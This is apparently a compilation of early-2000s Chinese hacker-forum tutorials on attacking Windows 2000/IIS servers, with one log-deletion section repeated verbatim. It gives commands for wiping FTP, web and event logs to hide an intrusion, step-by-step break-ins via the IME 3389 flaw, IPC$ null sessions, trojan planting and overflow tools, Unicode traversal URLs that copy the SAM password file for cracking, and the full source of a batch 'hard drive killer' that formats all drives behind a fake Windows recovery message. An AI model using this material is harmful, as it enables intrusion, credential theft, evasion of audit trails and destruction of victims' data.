032:09 127.0.0.1 [1]USER cyz 331　（IP地址为127.0.0.1用户名为cyz的用户试图登录）
0322 127.0.0.1 [1]PASS C 530　（登录失败）
0322 127.0.0.1 [1]USER administrator 331　（IP地址为127.0.0.1用户名为administrator试图登录）
0324 127.0.0.1 [1]PASS C 230　（登录成功）
0321 127.0.0.1 [1]MKD nt 550　（新建目录失败）
0325 127.0.0.1 [1]QUIT C 550　（退出FTP程序）

从日志里就能看出IP地址为127.0.0.1的用户一直试图登录系统，换了四次用户名和密码才成功，管理员立即就可以得知管理员的入侵时间、IP地址以及探测的用户名，如上例入侵者最终是用administrator用户名进入的，那么就要考虑更换此用户名的密码，或者重命名administrator用户。

WWW日志
WWW服务同FTP服务一样，产生的日志也是在%sys temroot%\sys tem32\LogFiles\W3SVC1目录下，默认是每天一个日志文件，下面是一个典型的WWW日志文件
#Software: Microsoft Internet Information Services 5.0
#Version: 1.0
#Date: 20001023 03:091
#Fields: date time cip csusername sip sport csmethod csuristem csuriquery scstatus cs(UserAgent)
20001023 03:091 192.168.1.26 192.168.1.37 80 GET /iisstart.asp 200 Mozilla/4.0+(compatible;+MSIE+5.0;+Windows+98;+DigExt)
20001023 03:094 192.168.1.26 192.168.1.37 80 GET /pagerror.gif 200 Mozilla/4.0+(compatible;+MSIE+5.0;+Windows+98;+DigExt)

通过分析第六行，可以看出2000年10月23日，IP地址为192.168.1.26的用户通过访问IP地址为192.168.1.37机器的80端口，查看了一个页面iisstart.asp,这位用户的浏览器为compatible;+MSIE+5.0;+Windows+98+DigExt，有经验的管理员就可通过安全日志、FTP日志和WWW日志来确定入侵者的IP地址以及入侵时间。
既使你删掉FTP和WWW日志，但是还是会在系统日志和安全日志里记录下来，但是较好的是只显示了你的机器名，并没有你的IP，例如上面几个探测之后，系统日志
将会产生下面的记录：

一眼就能看出2000年10月23日，16点17分，系统因为某些事件出现警告，双击头一个，打开它的属性：

属性里记录了出现警告的原因，是因为有人试图用administator用户名登录，出现一个错误，来源是FTP服务。
同时安全记录里写将同时记下  Ekin:此图不是此次示例的安全日志）


在上图中可以看到两种图标：钥匙（表示成功）和锁（表示当用户在做什么时被系统停止）。接连四个锁图标，表示四次失败审核，事件类型是帐户登录和登录、注销失败，日期为2000年10月18日，时间为1002，这就需要重点观察。
双点第一个失败审核事件的，即得到此事件的详细描述，如下图12所示：

分析上图，我们可以得知有个CYZ的工作站，用administator用户名登录本机，但是因为用户名未知或密码错误（实际为密码错误）未能成功。
另外还有DNS服务器日志，不太重要，就此略过（其实是我没有看过它）

知道了Windows2000日志的详细情况，下面就要学会怎样删除这些日志：
通过上面，得知日志文件通常有某项服务在后台保护，除了系统日志、安全日志、应用程序日志等等，它们的服务是Windos2000的关键进程，而且与注册表文件在一块，当Windows2000启动后，启动服务来保护这些文件，所以很难删除，而FTP日志和WWW日志以及Scedlgu日志都是可以轻易地删除的。
首先要取得Admnistrator密码或Administrators组成员之一，然后Telnet到远程主机，先来试着删除FTP日志：
D:\SERVER>del schedlgu.txt
D:\SERVER\SchedLgU.Txt
进程无法访问文件，因为另一个程序正在使用此文件。
说过了，后台有服务保护，先把服务停掉！
D:\SERVER>net stop "task scheduler"
下面的服务依赖于 Task Scheduler 服务。
停止 Task Scheduler 服务也会停止这些服务。

Remote Storage Engine

是否继续此操作? (Y/N) [N]: y
Remote Storage Engine 服务正在停止....
Remote Storage Engine 服务已成功停止。

Task Scheduler 服务正在停止.
Task Scheduler 服务已成功停止。
OK，它的服务停掉了，同时也停掉了与它有依赖关系的服务。再来试着删一下！
D:\SERVER>del schedlgu.txt
D:\SERVER>
没有反应？成功了！下一个是FTP日志和WWW日志，原理都是一样，先停掉相关服务，然后再删日志！
D:\SERVER\sys tem32\LogFiles\MSFTPSVC1>del ex*.log

D:\SERVER\sys tem32\LogFiles\MSFTPSVC1>
以上操作成功删除FTP日志！再来WWW日志！
D:\SERVER\sys tem32\LogFiles\W3SVC1>del ex*.log

D:\SERVER\sys tem32\LogFiles\W3SVC1>
OK！恭喜，现在简单的日志都已成功删除。下面就是很难的安全日志和系统日志了，守护这些日志的服务是Event Log，试着停掉它！
D:\SERVER\sys tem32\LogFiles\W3SVC1>net stop eventlog
这项服务无法接受请求的 "暂停" 或 "停止" 操作。
KAO，I　服了 U，没办法，它是关键服务。如果不用第三方工具，在命令行上根本没有删除安全日志和系统日志的可能！所以还是得用虽然简单但是速度慢得死机的办法：打开“控制面板”的“管理工具”中的“事件查看器”（98没有，知道用Win2k的好处了吧），在菜单的“操作”项有一个名为“连接到另一台计算机”的菜单，点击它如下图所示：

输入远程计算机的IP，然后点支烟，等上数十分钟，忍受象死机的折磨，然后打开下图：

选择远程计算机的安全性日志，右键选择它的属性：

点击属性里的“清除日志”按钮，OK！安全日志清除完毕！同样的忍受痛苦去清除系统日志！
目前在不借助第三工具的情况下，能很快，很顺利地清除FTP、WWW还有Schedlgu日志，就是系统日志和安全日志属于Windows2000的严密守护，只能用本地的事件查看器来打开它，因为在图形界面下，加之网速又慢，如果你银子多，时间闲，还是可以清除它的。综上所述，介绍了Windows2000的日志文件以及删除方法，但是你必须是Administrator，注意必须作为管理员或管理组的成员登录才能打开安全日志记录。该过程适用于 Windows 2000 Professional 计算机，也适用于作为独立服务器或成员服务器运行的 Windows 2000 Server 计算机。

至此，Windows2000安全知识基础讲座完毕，还有几句话要讲，大家也看出来了，虽然FTP等等日志可以很快清除，但是系统日志和安全日志却不是那么快、那么顺利地能删除，如果遇到聪明的管理员，将日志文件转移到另一个地方，那更是难上加难，所以奉劝大家，千万不要拿国内的主机做试验，国内的法律很严呀！今天吃饭时，听说有两个人开玩笑，一个人把另外一个人的东西藏起来了，结果那个人一急，报案了，于是藏东西那个人被判四年刑！！法官说法律是不开玩笑的！！！所以大家一定要牢记这点！(不要说我老生常谈)
如果大家有什么不明白地方，请在光和影子论坛提问！谢谢！

在上图中可以看到两种图标：钥匙（表示成功）和锁（表示当用户在做什么时被系统停止）。接连四个锁图标，表示四次失败审核，事件类型是帐户登录和登录、注销失败，日期为2000年10月18日，时间为1002，这就需要重点观察。
双点第一个失败审核事件的，即得到此事件的详细描述，如下图12所示：
分析上图，我们可以得知有个CYZ的工作站，用administator用户名登录本机，但是因为用户名未知或密码错误（实际为密码错误）未能成功。
另外还有DNS服务器日志，不太重要，就此略过（其实是我没有看过它）

知道了Windows2000日志的详细情况，下面就要学会怎样删除这些日志：
通过上面，得知日志文件通常有某项服务在后台保护，除了系统日志、安全日志、应用程序日志等等，它们的服务是Windos2000的关键进程，而且与注册表文件在一块，当Windows2000启动后，启动服务来保护这些文件，所以很难删除，而FTP日志和WWW日志以及Scedlgu日志都是可以轻易地删除的。
首先要取得Admnistrator密码或Administrators组成员之一，然后Telnet到远程主机，先来试着删除FTP日志：
D:\SERVER>del schedlgu.txt
D:\SERVER\SchedLgU.Txt
进程无法访问文件，因为另一个程序正在使用此文件。
说过了，后台有服务保护，先把服务停掉！
D:\SERVER>net stop "task scheduler"
下面的服务依赖于 Task Scheduler 服务。
停止 Task Scheduler 服务也会停止这些服务。

Remote Storage Engine

是否继续此操作? (Y/N) [N]: y
Remote Storage Engine 服务正在停止....
Remote Storage Engine 服务已成功停止。

Task Scheduler 服务正在停止.
Task Scheduler 服务已成功停止。
OK，它的服务停掉了，同时也停掉了与它有依赖关系的服务。再来试着删一下！
D:\SERVER>del schedlgu.txt
D:\SERVER>
没有反应？成功了！下一个是FTP日志和WWW日志，原理都是一样，先停掉相关服务，然后再删日志！
D:\SERVER\sys tem32\LogFiles\MSFTPSVC1>del ex*.log

D:\SERVER\sys tem32\LogFiles\MSFTPSVC1>
以上操作成功删除FTP日志！再来WWW日志！
D:\SERVER\sys tem32\LogFiles\W3SVC1>del ex*.log

D:\SERVER\sys tem32\LogFiles\W3SVC1>
OK！恭喜，现在简单的日志都已成功删除。下面就是很难的安全日志和系统日志了，守护这些日志的服务是Event Log，试着停掉它！
D:\SERVER\sys tem32\LogFiles\W3SVC1>net stop eventlog
这项服务无法接受请求的 "暂停" 或 "停止" 操作。
KAO，I　服了 U，没办法，它是关键服务。如果不用第三方工具，在命令行上根本没有删除安全日志和系统日志的可能！所以还是得用虽然简单但是速度慢得死机的办法：打开“控制面板”的“管理工具”中的“事件查看器”（98没有，知道用Win2k的好处了吧），在菜单的“操作”项有一个名为“连接到另一台计算机”的菜单，点击它如下图所示：

输入远程计算机的IP，然后点支烟，等上数十分钟，忍受象死机的折磨，然后打开下图：

选择远程计算机的安全性日志，右键选择它的属性：

点击属性里的“清除日志”按钮，OK！安全日志清除完毕！同样的忍受痛苦去清除系统日志！
目前在不借助第三工具的情况下，能很快，很顺利地清除FTP、WWW还有Schedlgu日志，就是系统日志和安全日志属于Windows2000的严密守护，只能用本地的事件查看器来打开它，因为在图形界面下，加之网速又慢，如果你银子多，时间闲，还是可以清除它的。综上所述，介绍了Windows2000的日志文件以及删除方法，但是你必须是Administrator，注意必须作为管理员或管理组的成员登录才能打开安全日志记录。该过程适用于 Windows 2000 Professional 计算机，也适用于作为独立服务器或成员服务器运行的 Windows 2000 Server 计算机。


【WinNT2k服务器一般攻击攻击过程】
WinNT2k服务器一般攻击攻击过程  



 
  来源:黑色世纪周刊 


本文用于教学!如果非法对他人服务器攻击,一切后果于本人没有关系! 
现在WinNT/2k服务器漏洞很多，可以利用的也不少，所以一些新入手的小hacker 
就看中了Win这个系统，下面说说，我以前的一些经验心得！高手免看！ 
首先工具：最好你要有个Nt/2k系统，哪个版本都可以 
Super Scanner 一个端口扫描程序，速度很快！ 
X-scanner 1.3 一个漏洞扫描程序包括了端口扫描，rpc扫描，CGI扫描 
简单的密码测试。并且开放了插件接口代码，和可以自己来加一些漏洞资料。 
并且支持Tcp/syn不同的扫描方式。 
流光,呵呵，还是自己看看吧，很久都没用到哪个东西了。 
sunx的 iis5hack.exe (.printf溢出）idahack.exe (.ida溢出) 
snake的 idq溢出 
netcat.exe 也就是 nc.exe 大家都知道了吧！ 
一个3389客户端，可以单独分离出来。 
Fontpage2000，有的时候这个也可以做为工具使用 
其他的，ndde.exe，和一些shellcode,这些，我们做为下篇介绍。 
sqlexec.exe 有的时候这个东西也很有用!
--------------------------------------------------------------------- 
1，扫描！ 
端口扫描，一般来说，对我们有用的端口 21,23,25,80,138/139.3389,79,1433,3306..... 
也有的是木马开的端口和其他的服务，并且端口也可以更改！ 
以前有个3389，也就是输入法漏洞，呵呵，做肉鸡挺不错的，但现在很少了~~55 
Super scanner 对台湾的地址进行扫描中，端口选择3389 
然后用3389客户端进行连接后，点id的时候，把输入法点出来，然后点帮助里， 
->输入法入门，后点鼠标左键，看到一个小的windows了吗。 
然后我们选择 
c:\winnt\system32\ 找到net.exe这个文件没有，找到后，然后创建 
一个快捷方式，修改属性net.exe user hacker q1w2e3 /add 后运行，当然，没什么 
反映，然后同样的方法net.exe localgroup administrators hacker /add，运行后，然后你就可以 
登陆这个系统了。然后都是同一过程，放后门，kill log 
或可以用上次我看到黑白发表的一篇文章,写到，到哪个小窗口的时候,我们可以写上一个ncx.exe或其他木马后门之类的软件,但不要是压缩过的,然后我们运行后....直接可以telnet ip port!
23,25端口 telnet www.xxx.com 23 or 25 我记得以前版本的sendmail 
有个bug可以把passwd发到你指定的mail里，现在呢？很少了。。。 
也可以来试着猜用户名和密码。。。。呵呵，但这样的人不是很多哦。 其实，可以用来做匿名邮件服务器使用.具体方法在下部介绍 
79端口，我们可以了解一些用户的信息。 
finger 0@www.xxx.com 
得到用户信息后，可以用一些ftp破解或简单用户密码猜测或letmain(好象是这个软件吧) 
80 呵呵，其实不光是做http服务来使用，可以作为端口重定向来使用，可以饶开防火墙（但不完全）呵呵，但稳定性不是很好！www.cnns.net的bingcheng 的站点 上有这个软件！ 
其实我们用的最多的就是80口上进行cgi/iis漏洞进行扫描！ 
1433,mssql服务,有个sa的用户,密码为"＂
然后可以利用　sql连接工具连接
　net user hack 234 /add
..................
然后net start看一下开了什么服务！
当然你也可以开启他的telnet ,3389或可以停止什么服务
具体请看net help
3306 mysql，有个root用户．密码空．
需要mysql客户端连接入．然后可以自己来编写些很小的语句就可以
做到你想做的事情．
常见的可以很好的利用的一些： 
Unicode/2次解码漏洞 
idq/ida 
Phf漏洞 
.printf 
FrontPage扩展漏洞 ………
具体请看cgi/iis漏洞资料表 
139 NETBIOS信息泄露,有可能可以使用ipc$空连接,或可以使用流光等工具进行简单用户密码猜测等. 
C:\>net use \\www.xxx.com \ipc$ “” /user:”” 建立空连接 
C:\>net view \\www.xxx.com\ 查看文件的共享 
C:\>net use \\www.xxx.com\c$ 建立一个连接通道 
C:\>dir \\www.xxx.com\c$ 显示远程服务器文件 
C:\>net time \\www.xxx.com 取得远程服务器时间 
C:\>copy svr.exe \\www.xxx.com\c$ 复制木马到远程服务器的c$中 
C:\> at time \\www.xxx.com\c$\svr.exe 指定时间运行 
下面说说一些常见的漏洞进行攻击! 
Unicode/2次解码漏洞: 
这个东西很古老了,但是前段时间的redcode/bulecode就是用的这个漏洞进行传播! 
一般的就是用ie来作为攻击软件,把cmd.exe换名后,可以 使用ftp调用脚本的方法 
或tftp来把木马或其他东西放到对方服务器中运行.sunx有个dll文件可以很容易的作到而且可以利用这个东西得到admin或对付一些ids.(www.521hacker.com)有详细资料. 
或可以使用echo命令来写一些东西,最经典的就是root.exe?/c+echo hacker by F-king>c:\inetpub\wwwroot\index.html 
. fontpage 扩展漏洞,可以使用fontpage作为工具登陆到服务器修改站点文件! 
.printf是一个iis中映射问题,只要不使用远程打印服务的话。就可以删除 
用iis5hack就可以得到一个shell,但时间不是很长,建立一个用户的时间道够了 
.idq snake有个溢出程序,gui版本的好用一点,但老是dos! 
.ida sunx 有个溢出程序.效果还不错!10次成功一次就不错了。呵呵 
:idahack www.xxx.com 80 指定sp 1 然后是shellport 我一般喜欢99-) 
然后nc Cvv www.xxx.com 99 或telnet www.xxx.com 99 
idq基本使用一样. 
---------------
入门2技巧:
看到一个站点后,telnet ip 80一下,然后看看返回值就知道什么服务器了.
比如,我不想开扫描软件,想知道有什么服务
http://www.xxx.com/.idq
.ida
.htr
.htw
msadcs.dll 有个mdac.pl的脚本可以导致攻击者远程执行你系统的命令 
......然后出现了什么，如果有这样的情况出现,我想哪个服务器
因该不是很安全的吧! -----------------好累.基本上就是这样 
以上的东西都可以到www.xfocus.net中或www.heibai.net找到! 
 
 
 


【一个批处理炸弹源码】
一个批处理炸弹源码 
文章来源：网络

@echo off
rem This program is dedecated to a very special person that does not want to be named.
:start
cls
echo PLEASE WAIT WHILE PROGRAM LOADS . . .
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat >nul
rem Drive checking and assigning the valid drives to the drive variable.

set drive=
set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z

rem code insertion for Drive Checking takes place here.
rem drivechk.bat is the file name under the root directory.
rem As far as the drive detection and drive variable settings, don't worry about how it 
rem works, it's d\*amn to complicated for the average or even the expert batch programmer.
rem Except for Tom Lavedas.

echo @echo off >drivechk.bat
echo @prompt %%%%comspec%%%% /f /c vol %%%%1: $b find "Vol" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat

cls
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

rem When errorlevel is 1, then the above is not true, if 0, then it's true.
rem Opposite of binary rules. If 0, it will elaps to the next command.

echo @prompt %%%%comspec%%%% /f /c dir %%%%1:.\/ad/w/-p $b find "bytes" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 goto enddc >>drivechk.bat

cls
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

rem if errorlevel is 1, then the drive specified is a removable media drive - not ready.
rem if errorlevel is 0, then it will elaps to the next command.

echo @prompt dir %%%%1:.\/ad/w/-p $b find " 0 bytes free" > nul >{t}.bat
%comspec% /e:2048 /c {t}.bat >>drivechk.bat
del {t}.bat
echo if errorlevel 1 set drive=%%drive%% %%1 >>drivechk.bat

cls
echo PLEASE WAIT WHILE PROGRAM LOADS . . .

rem if it's errorlevel 1, then the specified drive is a hard or floppy drive.
rem if it's not errorlevel 1, then the specified drive is a CD-ROM drive.

echo :enddc >>drivechk.bat

rem Drive checking insertion ends here. "enddc" stands for "end dDRIVE cHECKING". 

rem Now we will use the program drivechk.bat to attain valid drive information.

:testdrv

for %%a in (%alldrive%) do call drivechk.bat %%a >nul
del drivechk.bat >nul
if %drive.==. set drive=c

:form_del
call attrib -r -h c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Bunga >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Bunga >nul >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul >>c:\autoexec.bat
echo cd\ >>c:\autoexec.bat
echo cls >>c:\autoexec.bat
echo echo Welcome to the land of death. Munga Bunga's Multiple Hard Drive Killer version 4.0. >>c:\autoexec.bat
echo echo If you ran this file, then sorry, I just made it. The purpose of this program is to tell you the following. . . >>c:\autoexec.bat
echo echo 1. To make people aware that security should not be taken for granted. >>c:\autoexec.bat
echo echo 2. Love is important, if you have it, truly, don't let go of it like I did! >>c:\autoexec.bat
echo echo 3. If you are NOT a vegetarian, then you are a murderer, and I'm glad your HD is dead. >>c:\autoexec.bat
echo echo 4. Don't support the following: War, Racism, Drugs and the Liberal Party.>>c:\autoexec.bat

echo echo. >>c:\autoexec.bat
echo echo Regards, >>c:\autoexec.bat
echo echo. >>c:\autoexec.bat
echo echo Munga Bunga >>c:\autoexec.bat
call attrib +r +h c:\autoexec.bat

:makedir
if exist c:\temp.bat attrib -r -h c:\temp.bat >nul
echo @echo off >c:\temp.bat
echo %%1:\ >>c:\temp.bat
echo cd\ >>c:\temp.bat
echo :startmd >>c:\temp.bat
echo for %%%%a in ("if not exist %%2\nul md %%2" "if exist %%2\nul cd %%2") do %%%%a >>c:\temp.bat
echo for %%%%a in (">ass_hole.txt") do echo %%%%a Your Gone @$$hole!!!! >>c:\temp.bat
echo if not exist %%1:\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\nul goto startmd >>c:\temp.bat
call attrib +r +h c:\temp.bat >nul

cls
echo Initializing Variables . . .
rem deltree /y %%a:\*. only eliminates directories, hence leaving the file created above for further destruction.
for %%a in (%drive%) do call format %%a: /q /u /autotest >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
for %%a in (%drive%) do call c:\temp.bat %%a Munga >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
for %%a in (%drive%) call attrib -r -h %%a:\ /S >nul
call attrib +r +h c:\temp.bat >nul
call attrib +r +h c:\autoexec.bat >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
echo Initializing Application . . .

for %%a in (%drive%) call deltree /y %%a:\*. >nul
cls
echo Initializing Variables . . .
echo Validating Data . . .
echo Analyzing System Structure . . .
echo Initializing Application . . .
echo Starting Application . . .
for %%a in (%drive%) do call c:\temp.bat %%a Munga >nul

cls
echo Thank you for using a Munga Bunga product.
echo.
echo Oh and, Bill Gates rules, and he is not a geek, he is a good looking genius.
echo.
echo Here is a joke for you . . .
echo.
echo Q). What's the worst thing about being an egg?
echo A). You only get laid once.
echo.
echo HAHAHAHA, get it? Don't you just love that one?
echo.
echo Regards,
echo.
echo Munga Bunga

:end

rem Hard Drive Killer Pro Version 4.0, enjoy!!!!

rem Author: Munga Bunga - from Australia, the land full of retarded Australian's (help me get out of here). 
 


【一个找肉鸡的简单方法】
个找肉鸡的简单方法 

作者:d0nNy　来源:http://www.play8.net/ 


首先，你需要一个小东西，nc.exe。（什么东西？！～◎＃￥％……※×（－－－）阿嘎嘎，我也不知道，自己慢慢的搜索引擎里面找，你认为是什么就是什么了撒。^_^ 

接着编辑一个bat批处理文件。（什么是批处理，晕，来一个人送我去医院，哦，不是一群人。阿嘎嘎） 

－－－－－－－－－－cut here--------------------- 
@echo off 
:start 
nc -vv -w 5 -l -p 80>>httpd.log 
goto start 
－－－－－－－－－－cut here--------------------- 

运行批处理程序之后，你就等着肉鸡上门来找你吧，阿嘎嘎。 

（注：多为2000，中毒的主机，注意区分地区，有国外的主机，像我这里是拨号上网，一般来说，每天10个不成问题，中间夹杂着韩国的主机。） 

肉鸡特征： 
1。unicode漏洞 
2。guest密码为空，administrators组用户 
3。其他漏洞 

自己慢慢的爽去吧。不过，再次强调一句，不建议而且是不能破坏国内主机，上去以后将tftp.exe改名。然后用pskill干掉mmc.exe进程，之后是杀毒。做好后门以后，将guest帐号停用，以对付傻瓜扫描器。.........中间省略45037字。........尽量抓3389，用3389给肉鸡打补丁。之后就要恭喜你，你终于有自己的主机了，只是最好不要随便外传。 

两种好处： 
1。你有肉鸡用。 
2。向那些傻瓜级的网管学习怎么管理主机。 

两种坏处： 
1。暴露自己，被白帽子盯上。 
（有这样的可能性，不过连补丁都不晓得的网管怕他干什么。） 
2。过于的相信自己是黑客 
（我还是老老实实的看书，不懂汇编永远不是黑客，我不懂所以我不是。阿嘎嘎）



【一步一步教您用unicode漏洞入侵网站 】
一步一步教您用unicode漏洞入侵网站 
 
作者：不详 文章来源：internet 点击数：1177 更新时间：2004-3-22 
 
首先要说明的是unicode漏洞是什么？这个漏洞是俺们的高手袁哥发现的，袁哥是谁？袁仁广！袁仁广又是谁？晕~~~！！！

这个漏洞分四种，每一种针对不同语系的系统。分为：%c1%1c、%c0%cf、%c1%pc、%c0%9v。例如第一个 %c1%1c 的问题。c1 1c，中文简体里面没有这种字，照正常的情况根据内码转换文件\winnt\system32\c_936.nls会编码成“？”。但对中文简体版IIS中 c1 1c解码成了（c1-c0)*40+1c=5c=“\”。此编码发生在IIS检测处理路径串中的“..\”之后，所以可以突破IIS路径访问到上级目录。此漏洞从中文IIS4.0+SP6开始，还影响中文WIN2000+IIS5.0、中文WIN2000+IIS5.0+SP1，好像台湾繁体中文也受此漏洞影响。美国很多主机上也有这个漏洞，大都分是最后一种%c0%9v。好好利用吧，一步一步跟我来！

一、程序的实现
如果您对一个一个键打入命令不感兴趣的话，您可以直接看第二部分的工具篇，但我建议您还是看一看，使用工具也要用到一些命令的，我尽可能讲得通俗易懂一点。

假设你已经扫描到某台主机xxx.xxx.xxx.xxx有unicode漏洞（至于用什么工具扫描，工具篇中会讲到）打开你的浏览器，键入：

http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\

+在这里的意思是空格，也就是说这个命令在本机DOS下是：dir c:（列出远程主机C:\下的所有文件）

http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy+c:\autoexec.bat+c:\autoexec.bak

这个命令在本机DOS下是：copy c:\autoexec.bat c:\autoexec.bak（也就是复制远程主机C盘下的autoexec.bat并改名为autoexec.bak）

http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+del+c:\autoexec.bak

这个命令在本机DOS下是： del c:\autoexec.bak（也就是删除远程主机C盘下的autoexec.bak）

接下来的工作就是要把这台服务器NT的密码文件拷贝到网站目录下，为什么要拷贝到网站目录下呢？你有权限下载啊，笨~~~！！！

这又分两种情况，一种是直接用NT管理的机器，它的密码文件是sam._，另一种是用赛门铁克的远程管理软件PCAnyWhere进行远程管理，它的密码文件是*.cif，其实两种密码文件取得的方式都相同，只是得到密码后控制的方式不同罢了。

需要知道网站目录，可以通过ida、idq漏洞进行得到，也可以去寻找网站中的一个图片文件，比如Tscontent.gif文件，然后去查找该文件：使用命令 dir c:\ Tscontent.gif /s，知道目录后，比如为c:\inetpub\wwwroot\，接下来
1、sam._的文件的取得

http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy+c:\winnt\repair\sam._+c:\inetpub\wwwroot\

看懂了吗？把c:\winnt\repair下的sam._复制到c:\inetpub\wwwroot\
接下来，http://xxx.xxx.xxx.xxx/sam._ ，把sam._下载到本地

2、*.cif的取得
http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\*.cif+/s

这是搜索C盘下的cif文件，通常找出来的有Citempl.cif和另一个什么名字的cif文件，一般Citempl.cif为系统默认的密码文件，因此我们需要后者，例如叫SA.CIF，它所在目录为c:\Program Files\pcANYWHERE\DATA，执行：
http://xxx.xxx.xxx.xxx/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+copy+c:\Program Files\pcANYWHERE\DATA\SA.CIF+c:\inetpub\wwwroot\


把c:\Program Files\pcANYWHERE\DATA下的SA.CIF复制到c:\inetpub\wwwroot\


接下来，http://xxx.xxx.xxx.xxx/SA.CIF ，把SA.CIF下载到本地

重要的一点是下载完毕以后记住把c:\inetpub\wwwroot\sam._或c:\inetpub\wwwroot\SA.CIF给删掉，清除你的痕迹！

得到密码文件后
1、sam._文件
sam._的文件的破解工具叫L0phtCrack，工具篇会详细提到，这里就不多说了。执行L0phtCrack并得到Nt Password，比如说是123456，执行：C:\>newletmein \\xxx.xxx.xxx -admin 

扫描主机，发现管理员ID是：asdfghjk,执行：C:\>net use \\xxx.xxx.xxx.xxxc$123456 /user:asdfghjk 成功联上对方主机，大功告成！现在你就是root的身份了，为所欲为吧，兄弟！

2、*.cif
*.cif的文件的破解工具叫pcanywherepwd，工具篇会详细提到，这里就不多说了。执行pcanywherepwd并得到PCAnyWhere Password，启动PCAnyWhere登陆主机，又一个管理员出现了，呵呵!

最后记住一点，NT存放日志的目录在：winnt\system32\logfiles，记住毁尸灭迹！

二、工具篇
以下所以工具均能在雨汐网站 http://rainxi.yeah.net/ 的黑客工具中的 unicode完全工具包里找到！（本地下载）

前面我们提到了有工具可以扫描出那些主机有UNICODE漏洞，这个工具叫UNICODE漏洞扫描仪，能扫描指定网段内有UNICODE漏洞的主机，在工具包里为unicode_scanner.zip。界面如图：


很简单吧，填入你想扫描的起始IP和结束IP，让它慢慢扫吧。扫描速度的数值不要填太大，否则很容易出错。

在程序实现篇里讲了那么多难记的命令，您是不是快记不住了，不要紧，DOS您会用吧？下面出场的这个工具叫unicode，它能远程利用unicode漏洞执行类似DOS命令，在工具包里为unicode.zip。界面如图：


在菜单“File”中选择“Connect...”，在弹出的窗口中分别填入所要连接主机的IP和Excute类型，A、B、C、D分别对应%c1%1c、%c0%cf、%c1%pc、%c0%9v。然后OK，然后键入DOS命令，就像操作本机一样简单。

接下来介绍的是两种密码文件的破解工具
1、sam._文件
开始说到了sam._的文件的破解工具叫L0phtCrack，在工具包里为lc252.zip，它的注册机为cr_cllck2.zip，界面如图：


菜单“File-Import SAM File...”，导入sam._文件，菜单“File-Open Password File...”导入字典，菜单“Tools-Run Crack”，开始破解。

大家看到了，实际上这就是一个暴力破解器，要用到字典，时间可能比较长。还有网友来信问我什么是字典，你真是!@#$%,字典是你所猜测密码的组合，格式通常为DIC，TXT，一行一个，破解器会逐行取出测试，直到密码正确和字典用完为止。

这里你可以用本站字典工具中的万能钥匙 ，它是一个符合中国人习惯的字典生成机。生成的字典大小最好不要大于10Mb，要是字典过大可以用分割软件将其分成几个部分。否则容易死机！！！ 

2、*.cif
开始说到了*.cif的文件的破解工具叫pcanywherepwd，在工具包里为pcanywherepwd.zip，界面如图：


这个工具的使用就更简单了，导入*.cif文件，点Crack，用户名和密码就得到了。

得到密码后的入侵请看上面的程序实现篇！！！对了，赛门铁克的PCAnyWhere9.2我是在它的主页下的，这个软件有19兆多，我是不可能放上来了，大家到赛门铁克的主页去下吧 http://www.symantec.com/ 具体什么位置我就不记得了，太久了，一定能找得到的！另外我送大家PCAnyWhere的注册机，在工具包里为cr_PC Anywhere92.zip，听说这个软件要卖3000多呢，您呐，就偷着乐吧，哈哈哈哈~~~~！！！

以上所提工具包可在雨汐网 http://rainxi.yeah.net/ 的黑客攻击栏目下载，名称为“unicode完全工具包
 
 


【三类2000系统进程总列表】
                     三类2000系统进程总列表

三类2000系统进程总列表 
最基本的系统进程（也就是说，这些进程是系统运行的基本条件，有了这些进程，系统就能正常运行） 
smss.exe Session Manager 
csrss.exe 子系统服务器进程 
winlogon.exe 管理用户登录 
services.exe 包含很多系统服务 
